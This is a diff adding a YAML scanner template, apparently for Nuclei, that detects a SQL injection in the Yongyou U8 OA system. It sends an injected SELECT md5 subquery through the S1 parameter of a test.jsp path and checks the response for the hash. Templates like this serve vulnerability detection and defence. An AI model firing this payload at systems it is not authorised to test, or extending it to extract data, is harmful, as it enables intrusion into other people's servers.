@@ -1,0 +1,25 @@
+id: poc-yaml-yongyou-u8-oa-sqli
+info:
+  name: Yongyou U8 OA SQL Injection
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: sql-injection
+  description: |
+    Detects potential SQL injection vulnerability in Yongyou U8 OA system.
+
+variables:
+  rand: "{{rand_int(100000, 900000)}}"
+
+http:
+  - method: GET
+    path:
+      - "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{rand}}))"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{md5(rand)}}"
+        part: body
